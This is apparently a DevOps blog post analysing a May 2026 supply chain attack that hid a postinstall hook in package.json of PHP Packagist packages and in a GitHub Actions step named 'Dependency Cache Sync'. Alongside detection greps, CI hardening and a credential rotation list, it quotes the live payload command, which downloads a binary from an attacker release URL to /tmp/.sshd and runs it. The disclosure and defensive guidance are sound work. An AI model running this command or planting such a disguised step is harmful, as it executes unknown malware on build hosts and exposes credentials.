---
title: "When the Malicious Hook Is in the Other Manifest: 700+ Repos, 8 Packagist Packages, One package.json Trick"
excerpt: "On May 22, 2026, Socket disclosed a Composer supply chain attack that hid an npm-style postinstall command inside package.json on PHP projects. composer.json was clean, the PHP review missed it, and 700+ GitHub repos pulled it in. Here is the exact payload, why ecosystem-boundary blindness keeps catching teams, and how to wire your CI to look at both manifests."
category:
  name: 'DevOps'
  slug: 'devops'
date: '2026-05-23'
publishedAt: '2026-05-23T09:30:00Z'
updatedAt: '2026-05-23T09:30:00Z'
readingTime: '10 min read'
author:
  name: 'DevOps Daily Team'
  slug: 'devops-daily-team'
featured: true
tags:
  - Supply Chain
  - Security
  - Packagist
  - npm
  - PHP
  - GitHub Actions
---

On May 22, 2026, [Socket disclosed](https://socket.dev/blog/malicious-postinstall-hook-found-across-700-github-repos) a supply chain campaign that confirmed something defenders already half-knew: if your project carries two ecosystems' manifests, an attacker only has to poison the one your review process ignores. The campaign hit eight Packagist (PHP / Composer) packages including the popular Laravel SaaS starter `devdojo/wave` (6,400 GitHub stars) and `devdojo/genesis` (9,100 Packagist installs). The malicious code was not in `composer.json`. It was in `package.json`. A PHP team running their normal Composer dependency review would never have seen it.

Within 17 hours of detection, a GitHub code search for the attacker-controlled account `parikhpreyash4` was returning hundreds of public code results across Node.js repositories. The total reach landed somewhere north of 700 GitHub repos pulling the same install hook, with a secondary spread vector hiding in `.github/workflows/ci.yml` as a step innocently named "Dependency Cache Sync".

This post covers what the payload does, why the cross-manifest hiding trick keeps working, the one-liner that tells you whether any PHP repo you maintain is exposed, and how to make your CI look at every manifest a repo carries instead of just the one that matches the language you think it's written in.

## TL;DR

- 8 Packagist packages were compromised by adding an npm-style `postinstall` script to `package.json` (not `composer.json`). Most were development branches (`dev-main`, `dev-master`, `3.x-dev`), which is enough to hit anyone pinning to a branch instead of a tag.
- The script downloads a Linux binary from a GitHub Releases URL, saves it as `/tmp/.sshd`, makes it executable, and runs it in the background. The binary itself was pulled from GitHub before researchers could grab a copy.
- The attacker also injected the same command into `.github/workflows/ci.yml` of public forks as a step called "Dependency Cache Sync". A merged PR can plant this; subsequent CI runs will re-infect even after the package itself is cleaned.
- The PHP angle is the story. Cross-ecosystem manifests in a single repo are normal (any Laravel app with a Vite or Tailwind build ships both `composer.json` and `package.json`). Most security review pipelines only audit the manifest of the language they think the repo is.
- Detection one-liner is at the bottom. Rotation order at the very bottom.

## The exact payload

This is the literal command the attacker added to `package.json`'s `scripts.postinstall` field:

```bash
curl -skL https://github.com/parikhpreyash4/systemd-network-helper-aa5c751f/releases/latest/download/gvfsd-network -o /tmp/.sshd 2>/dev/null && chmod +x /tmp/.sshd && /tmp/.sshd &
```

Four things to notice:

1. `-s` suppresses curl's progress meter, `-k` skips TLS certificate verification, `-L` follows redirects. The verification skip is the tell. Nothing legitimate downloads a release binary with `-k`.
2. The output path `/tmp/.sshd` is chosen to look like a system file. A casual `ls /tmp` won't see it (leading dot is hidden), and a `ps aux | grep ssh` returns a process that looks like the real OpenSSH daemon.
3. `2>/dev/null` discards stderr, so a failed download produces no log line.
4. The `&` at the end forks the binary into the background and returns immediately. From the CI runner's perspective, `npm install` finished cleanly. The malicious binary is now running.

The binary itself (`gvfsd-network`) was hosted at:

```text
https://github.com/parikhpreyash4/systemd-network-helper-aa5c751f/releases/latest/download/gvfsd-network
```

Both the file name and the repo name are deliberate noise. `gvfsd-network` looks like a GNOME virtual filesystem helper. `systemd-network-helper-aa5c751f` looks like an internal systemd component with a commit-hash suffix. Neither is real. The attacker yanked the binary from GitHub Releases before Socket could grab a sample, so we don't know what stage 2 did, but the install pattern (background binary, hidden path, suppressed errors) is consistent with a credential stealer or a persistent C2 beacon, which is what every other Shai-Hulud and Mini-Shai-Hulud wave this month has shipped.

## The package.json trick

Composer packages are PHP. Their canonical manifest is `composer.json`. A PHP team's dependency review pipeline reads `composer.json` and `composer.lock`. They look for new dependencies, version bumps, suspicious authors, and anything weird in `scripts` (Composer has its own `scripts` system that runs PHP class methods).

Composer packages can also ship `package.json` for their build-time JavaScript assets. `devdojo/wave` is a Laravel starter that includes a Tailwind UI; the repo carries both manifests. When you `composer require devdojo/wave`, Composer doesn't run npm scripts. But the project's `package.json` is now sitting in your `vendor/devdojo/wave/` directory, and the moment your build pipeline does an `npm install` against it (or against your monorepo from its root, picking up nested `node_modules`), the `postinstall` hook fires.

That is the only ecosystem boundary the attacker had to cross. Their malicious commit looks like a normal commit to a Composer package, with a one-line addition to a file PHP devs never read.

This is not theoretical. Every Laravel project with a Vite or Tailwind build has the dual-manifest shape. Every npm package that ships native bindings has both `package.json` and `binding.gyp`. Every Cargo crate that vendors a Python wheel has both `Cargo.toml` and `pyproject.toml`. The defender pattern of "audit the manifest of the ecosystem we think we are in" is wrong every time.

## The GitHub Actions re-infection vector

Socket also found the same install command embedded in `.github/workflows/ci.yml` of `448776129/UA2F`, a public fork of `Zxilly/UA2F`, as a workflow step named **Dependency Cache Sync**.

```yaml
- name: Dependency Cache Sync
  run: |
    curl -skL https://github.com/parikhpreyash4/systemd-network-helper-aa5c751f/releases/latest/download/gvfsd-network -o /tmp/.sshd 2>/dev/null \
      && chmod +x /tmp/.sshd \
      && /tmp/.sshd &
```

The step name is the malicious part. "Dependency Cache Sync" sounds like a routine step you'd skim past in a PR review. It looks like every other CI cache step you've seen.

Why this matters: the GitHub Actions step survives the Packagist cleanup. Packagist removed the bad versions, but a fork that already merged the malicious workflow step keeps re-infecting its own CI runner on every push. If those runners have OIDC tokens for cloud accounts, or push permissions back to the upstream repo, that re-infection turns into a propagation loop that the original cleanup did nothing about.

If the original Packagist take-down felt like the end of the story when you saw the news yesterday, this is the part that isn't done.

## Are you exposed? One-liner grep

The fast check across every repo you maintain locally. From a parent directory:

```bash
# Find any package.json scripts that download a binary from a GitHub release
# and pipe it into /tmp/. Catches the parikhpreyash4 campaign and any near-copies.
find . -name package.json -not -path '*/node_modules/*' -print0 \
  | xargs -0 grep -l -E 'curl.*github\.com.*releases.*-o /tmp/\.' 2>/dev/null
```

And for already-installed Composer dependencies on a running app, check `vendor/`:

```bash
find vendor -name package.json -print0 \
  | xargs -0 grep -l -E 'curl.*github\.com.*releases.*-o /tmp/\.' 2>/dev/null
```

The narrower check for the exact known IoCs:

```bash
grep -RE 'parikhpreyash4|systemd-network-helper-aa5c751f|/tmp/\.sshd' \
  --include='package.json' --include='*.yml' --include='*.yaml' \
  -l . 2>/dev/null
```

On a running CI runner, also check for the binary itself:

```bash
ls -la /tmp/.sshd 2>/dev/null \
  && ps auxf | awk '/[\.]sshd|sshd / {print}'
```

A real OpenSSH daemon will be `/usr/sbin/sshd`. A process running from `/tmp/.sshd` is the malware, regardless of how it shows up in `ps`.

## Hardening: make CI look at every manifest

The structural fix is to scan every manifest in every repo, regardless of what language you think the repo is. A minimal GitHub Actions step that does the right thing:

```yaml
name: Cross-manifest dependency audit
on:
  pull_request:
  push:
    branches: [main]

jobs:
  audit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      # Run Socket's scanner against every manifest in the repo, not just
      # the one matching the primary language. Socket reads composer.json,
      # package.json, requirements.txt, Cargo.toml, go.mod, and others —
      # so a Composer repo with a hidden package.json hook gets caught.
      - name: Socket audit (every manifest)
        uses: SocketDev/socket-security-action@v1
        with:
          api-key: ${{ secrets.SOCKET_API_KEY }}

      # A defense-in-depth grep for the install-time-script pattern. Cheap,
      # zero deps, catches obvious cases even on repos that don't have a
      # Socket org set up.
      - name: Grep for install-time binary downloads
        run: |
          set -euo pipefail
          MATCHES=$(grep -rE 'curl.*github\.com.*releases.*-o /tmp/\.' \
            --include='package.json' --include='composer.json' \
            --include='*.yml' --include='*.yaml' \
            . || true)
          if [ -n "$MATCHES" ]; then
            echo "::error::Install hook downloads binary to /tmp/. Refusing build."
            echo "$MATCHES"
            exit 1
          fi
```

Two things to wire into your branch protection on top of that:

- **Block any PR that adds or modifies a `postinstall`, `preinstall`, or `install` script in `package.json`** without a CODEOWNERS review by your security team. This is policy, not tooling. Your CODEOWNERS file can target `package.json` directly.
- **Pin Composer dependencies to tags, not branches.** Every package in this campaign was compromised on `dev-main`, `dev-master`, or `3.x-dev`. If your `composer.json` has `"devdojo/wave": "dev-main"`, Composer pulls whatever the branch HEAD is at install time, which is exactly what attackers want. Pin to a semver tag instead: `"devdojo/wave": "^1.4.2"`.

For GitHub Actions workflows, set `permissions: contents: read` at the workflow level and require explicit elevation in any step that needs `write`. A "Dependency Cache Sync" step that needs `contents: write` to push a binary download into `/tmp/` is suddenly very visible in a PR diff.

## If you were exposed: rotation order

Same drill as every other supply chain compromise in May. If a runner or developer machine executed the postinstall hook, treat everything reachable from that machine as burned.

1. **GitHub tokens first.** `gh auth logout`, revoke every PAT at https://github.com/settings/tokens, reissue with minimum scope. Doing this first prevents the attacker from pushing a worm-propagation commit to repos you maintain.
2. **Cloud STS sessions.** AWS: revoke active sessions for the IAM role that the runner used. GCP: `gcloud auth revoke --all`. Azure: `az logout && az account clear`.
3. **Long-lived cloud keys.** Rotate IAM access keys, GCP service account JSON keys, Azure SP credentials. Anything that was on disk in `~/.aws/credentials` or the equivalent.
4. **SSH keys.** Reissue keypairs. Remove the compromised machine's public key from every `authorized_keys` it sat in.
5. **Kubeconfig.** Rotate the cluster CA-signed certs for the user.
6. **App secrets.** Anything in `.env`, anything in your secrets manager that the runner had pull access to.
7. **Composer auth tokens.** `~/.composer/auth.json` holds Packagist credentials, private repository tokens, and GitHub OAuth for Composer. Rotate them.

Then nuke `/tmp/.sshd` and any running process from it, and rebuild the runner from a known-clean image. Don't try to clean up in place. The binary was background-forked, it could have written persistence elsewhere, and you can't grep your way to confidence on a host that ran an unknown stage-2 binary.

## Why this keeps happening

This is the fifth coordinated supply chain campaign we've covered in the last six weeks. AntV (Shai-Hulud worm hitting `@antv` packages and `echarts-for-react`). TanStack (npm + GitHub Actions cache poisoning + dead-man's switch). node-ipc (DNS-tunneling credential exfil). The two PyPI / npm Mini-Shai-Hulud waves. Now this one.

The pattern is consistent: attackers are getting better at finding the seam between two systems where the defender's review process stops. TanStack exploited the seam between forked PRs and trusted CI cache. node-ipc exploited the seam between HTTPS egress controls and DNS resolution. This one exploited the seam between PHP review and JavaScript review on a repo that carries both.

The fix is not another tool. It's the operational discipline of looking at every manifest, every workflow, every script that runs on your build infrastructure, regardless of what language you think the project is. The teams that get hit are the ones that built their dependency-review process around one language and never thought about what happens when a Composer package ships a `package.json`.

## Summary

The May 22 Packagist campaign hit 8 packages and 700+ GitHub repos by hiding a `postinstall` hook in `package.json` instead of `composer.json`. PHP review pipelines missed it. The same install command shows up in `.github/workflows/ci.yml` files under the name "Dependency Cache Sync" as a re-infection vector that survives the package cleanup.

Today's actions for any team running PHP:

- Grep every `package.json` in `vendor/` and in your own repos for `curl ... /tmp/.`.
- Pin Composer dependencies to tags, not branches.
- Add CODEOWNERS protection on `package.json` install-script changes.
- Run a cross-manifest scanner in CI so the next attacker hiding in the other ecosystem's file gets flagged before merge.

Sources: [Socket's original disclosure](https://socket.dev/blog/malicious-postinstall-hook-found-across-700-github-repos), [Cybersecurity News coverage of the Laravel-Lang variant](https://cybersecuritynews.com/laravel-lang-packages-compromised/), and the Aikido write-up on [Laravel-Lang credential stealer](https://www.aikido.dev/blog/supply-chain-attack-targets-laravel-lang-packages-with-credential-stealer).
